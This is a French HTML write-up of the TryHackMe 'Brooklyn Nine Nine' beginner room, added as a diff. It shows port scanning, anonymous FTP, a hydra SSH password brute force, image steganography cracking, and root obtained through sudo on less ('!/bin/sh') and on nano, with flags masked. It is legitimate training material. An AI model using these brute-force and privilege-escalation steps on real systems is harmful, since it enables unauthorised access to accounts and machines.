@@ -1,0 +1,349 @@
+<!--META
+title: Brooklyn Nine Nine
+platform: TryHackMe
+category: Challenge
+difficulty: Easy
+date: juillet 2026
+points: 60
+META-->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Write-up — Brooklyn Nine Nine</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #010409;
+      font-family: ui-monospace, 'Cascadia Code', 'Fira Code', 'SF Mono', monospace;
+      padding: 2rem 1rem;
+      min-height: 100vh;
+    }
+    .step-body p {
+      margin-top:7px;
+    }
+    .window {
+      max-width: 820px; margin: 0 auto;
+      background: #0d1117; border: 1px solid #30363d; border-radius: 8px; overflow: hidden;
+    }
+    .titlebar {
+      background: #161b22; border-bottom: 1px solid #30363d;
+      padding: 10px 16px; display: flex; align-items: center; gap: 7px;
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; flex-shrink: 0; }
+    .dot.r { background: #ff5f57; }
+    .dot.y { background: #ffbd2e; }
+    .dot.g { background: #28c840; }
+    .titlebar-name { font-size: 12px; color: #8b949e; margin-left: 8px; }
+    .body { padding: 22px; color: #c9d1d9; }
+    .challenge-title {
+      font-size: 20px; font-weight: 600; color: #e6edf3;
+      border-left: 2px solid #58a6ff; padding-left: 12px; margin-bottom: 5px;
+    }
+    .meta {
+      font-size: 12px; color: #8b949e; padding-left: 14px;
+      margin-bottom: 22px; display: flex; gap: 14px; flex-wrap: wrap; align-items: center;
+    }
+    .badge {
+      display: inline-block; padding: 2px 8px; border-radius: 4px;
+      font-size: 10px; font-weight: 600;
+      background: #0d2818; color: #3fb950; border: 1px solid #2ea043;
+    }
+    .section { margin-bottom: 22px; }
+    .section-label {
+      font-size: 11px; color: #58a6ff; text-transform: uppercase;
+      letter-spacing: 0.09em; margin-bottom: 10px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .section-label::after { content: ''; flex: 1; height: 1px; background: #21262d; }
+    .enonce {
+      background: #161b22; border: 1px solid #30363d;
+      border-left: 2px solid #484f58; border-radius: 0 5px 5px 0;
+      padding: 10px 14px; font-size: 13px; color: #8b949e;
+      line-height: 1.65; font-style: italic;
+    }
+    .tools { display: flex; flex-wrap: wrap; gap: 7px; }
+    .tool {
+      background: #161b22; border: 1px solid #30363d;
+      color: #8b949e; padding: 4px 11px; border-radius: 4px; font-size: 12px;
+    }
+    .steps { display: flex; flex-direction: column; gap: 10px; }
+    .step { background: #161b22; border: 1px solid #21262d; border-radius: 6px; overflow: hidden; }
+    .step-header {
+      background: #0d1117; border-bottom: 1px solid #21262d;
+      padding: 8px 14px; display: flex; align-items: center; gap: 10px;
+    }
+    .step-num  { color: #3fb950; font-size: 11px; font-weight: 600; }
+    .step-title { color: #e6edf3; font-size: 12px; }
+    .step-body { padding: 10px 14px; font-size: 12px; line-height: 1.65; color: #8b949e; }
+    .step-body code {
+      background: #0d1117; border: 1px solid #30363d; border-radius: 3px;
+      padding: 1px 5px; font-size: 11px; color: #c9d1d9;
+    }
+    .result {
+      display: flex; gap: 8px; margin-top: 8px; padding: 6px 10px;
+      background: #0d2818; border-left: 2px solid #2ea043;
+      color: #7ee2a8; font-size: 11px; line-height: 1.5;
+    }
+    .result::before { content: '[trouvé]'; font-weight: 600; flex-shrink: 0; color: #3fb950; }
+    .codeblock {
+      background: #010409; border: 1px solid #21262d; border-radius: 4px;
+      padding: 8px 12px; font-size: 11px; color: #c9d1d9;
+      margin-top: 8px; white-space: pre; overflow-x: auto;
+    }
+    .flag-box { background: #0d2818; border: 1px solid #2ea043; border-radius: 6px; padding: 14px 18px; }
+    .flag-label {
+      font-size: 11px; color: #3fb950; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 6px;
+    }
+    .flag-label::before { content: '▸ '; }
+    .flag-value { font-size: 14px; color: #7ee2a8; font-weight: 600; }
+    @media (max-width: 600px) { body { padding: 1rem 0.5rem; } .body { padding: 16px; } }
+  </style>
+</head>
+<body>
+<div class="window">
+  <div class="titlebar">
+    <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+    <span class="titlebar-name">writeup — Brooklyn Nine Nine — TryHackMe</span>
+  </div>
+  <div class="body">
+
+    <div class="challenge-title">Brooklyn Nine Nine</div>
+    <div class="meta">
+      <span>TryHackMe</span>
+      <span>Challenge</span>
+      <span>juillet 2026</span>
+      <span class="badge">Easy</span>
+    </div>
+
+    <div class="section">
+      <div class="section-label"># énoncé</div>
+      <div class="enonce">"This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.<br>
+        ---<br>
+        Find the flag!"</div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"># outils</div>
+      <div class="tools">
+        <span class="tool">nmap</span>
+        <span class="tool">Code source</span>
+        <span class="tool">web console</span>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"># résolution</div>
+      <div class="steps">
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[01]</span>
+            <span class="step-title">2 méthodes, pour un même flag</span>
+          </div>
+          <div class="step-body">
+            D'après l'énoncé, il existe deux méthodes pour trouver les flags.<br>
+            Nous allons voir les deux méthodes l'une après l'autre.
+            
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[02]</span>
+            <span class="step-title">Méthode 1 / nmap</span>
+          </div>
+          <div class="step-body">
+            Première étape classique : découverte des ports de la machine.<br>
+            Nous pouvons remarquer que le service ftp accepte les connexions anonymes, c'est sans doute par là que nous allons commencer nos investigations.
+            <div class="codeblock">PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+[...]
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</div>
+            <div class="result">ras</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[03]</span>
+            <span class="step-title">Méthode 1 / FTP</span>
+          </div>
+          <div class="step-body">
+            Nous tentons une connexion en ftp de façon anonyme directement.
+            <div class="codeblock">root@ip-XX-XX-XXX-XXX:~# ftp IP_ADDRESS
+Connected to XX-XX-XXX-XXX.
+220 (vsFTPd 3.0.3)
+Name (XX-XX-XXX-XXX:root): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt;</div>
+            L'accès est bien fonctionnel.<br>
+            Nous trouvons un fichier, qui est un message d'Amy, demandant à Jake de changer son mot de passe.<br>
+            Nous ne pouvons pas changer de répertoire, ce qui met fin à cette piste, nous devrons chercher ailleurs pour trouver les flags.
+            
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[04]</span>
+            <span class="step-title">Méthode 1 / Hydra</span>
+          </div>
+          <div class="step-body">
+            Nous partons du principe que le compte de Jake aura jake comme identifiant.<br>
+            Nous pouvons utiliser hydra pour bruteforce son mot de passe, en sachant qu'il est faible, donc facilement craquable.
+            <div class="codeblock">root@ip-XX-XX-XXX-XXX:~# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://IP_MACHINE
+[DATA] attacking ssh://XX-XX-XXX-XXX:22/
+[22][ssh] host: IP_MACHINE   login: jake   password: 9*******1</div>
+            <div class="result">le mot de passe de Jake</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[05]</span>
+            <span class="step-title">Méthode 1 / SSH</span>
+          </div>
+          <div class="step-body">
+            Grâce au mot de passe, nous pouvons nous connecter en SSH.
+            <div class="codeblock">ssh jake@XX-XXX-XXX-XXX
+jake@XX-XXX-XXX-XXX's password: 
+Last login: Tue May 26 08:56:56 2020</div>
+            Nous pouvons ensuite chercher où est le fichier user.txt, que nous pouvons ensuite lire pour trouver le premier flag.
+            <div class="codeblock">jake@brookly_nine_nine:~$ find / -type f -name "user.txt" 2&gt;/dev/null
+/home/holt/user.txt
+jake@brookly_nine_nine:~$ cat /home/holt/user.txt
+e******************************e</div>
+            <div class="result">e******************************e</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[06]</span>
+            <span class="step-title">Root flag</span>
+          </div>
+          <div class="step-body">
+            En regardant ce que peut faire le compte de Jake en sudo, nous pouvons voir qu'il peut lancer less :
+            <div class="codeblock">jake@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/CODE:sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less</div>
+            Selon le site https://gtfobins.org/gtfobins/less, il suffit de taper 
+            <div class="codeblock">!/bin/sh</div>
+            à l'intérieur d'un less pour devenir root.<br>
+            Nous allons tenter cette approche :
+            <div class="codeblock">jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/hosts
+# whoami
+root</div>
+            Nous pouvons facilement lire le fichier du flag.
+            <div class="codeblock"># cat /root/root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 6******************************5
+
+Enjoy!!</div>
+            <div class="result">6******************************5</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[07]</span>
+            <span class="step-title">Méthode 2 / stéganographie</span>
+          </div>
+          <div class="step-body">
+            Une seule image, pleine page et des indications pour mieux la visualiser.<br>
+            Le code source du site nous donne un indice : "connaissez-vous la stéganographie ?".<br>
+            Nous allons donc essayer d'extraire des informations de l'image présente sur la page d'accueil.
+            Nous utilisons stegcracker pour extraire des informations.
+            <div class="codeblock">root@ip-XX-XXX-XXX-XXX:~# stegcracker Downloads/brooklyn99.jpg 
+StegCracker has been retired following the release of StegSeek, which 
+will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+to StegCracker which takes ~5 hours.
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file 'Downloads/brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: admin
+Tried 20586 passwords
+Your file has been written to: Downloads/brooklyn99.jpg.out</div>
+            Nous pouvons maintenant visualiser le fichier.
+            <div class="codeblock"> root@ip-XX-XXX-XXX-XXX:~# cat Downloads/brooklyn99.jpg.out
+Holts Password:
+f******************e
+
+Enjoy!!</div>
+            Nous venons donc de trouver le mot de passe d'un compte sur la machine.
+            <div class="result">le mot de passe de Holt</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[08]</span>
+            <span class="step-title">Méthode 2 / ssh</span>
+          </div>
+          <div class="step-body">
+            Grâce aux informations, nous pouvons nous connecter en SSH à la machine avec le compte du capitaine Holt.
+            <div class="codeblock">ssh holt@XX-XXX-XXX-XXX
+holt@XX-XXX-XXX-XXX's password: 
+Last login: Tue May 26 08:59:00 2020</div>
+            Nous pouvons ensuite lister le dossier /home de Holt. Nous pouvons ensuite lire le fichier user.txt pour trouver le premier flag.
+            <div class="codeblock">holt@brookly_nine_nine:~$ ls
+nano.save  user.txt
+holt@brookly_nine_nine:~$ cat user.txt 
+e******************************e</div>
+            <div class="result">e******************************e</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-header">
+            <span class="step-num">[09]</span>
+            <span class="step-title">Root flag</span>
+          </div>
+          <div class="step-body">
+            De la même manière que pour le compte de Jake, nous pouvons voir que le compte de Holt peut lancer nano :
+            <div class="codeblock">holt@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/CODE:sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano</div>
+            Nous pouvons tenter de lancer nano en sudo sur le fichier du flag et cela fonctionne, nous obtenons le flag. 
+            <div class="codeblock">holt@brookly_nine_nine:~$ sudo /bin/nano /root/root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 6******************************5
+
+Enjoy!!</div>
+            <div class="result">6******************************5</div>
+          </div>
+        </div>
+
+
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-label"># flag</div>
+      <div class="flag-box">
+        <div class="flag-label">flag validé</div>
+        <div class="flag-value">[PLATEFORME]{valeur_du_flag}</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</body>
+</html>
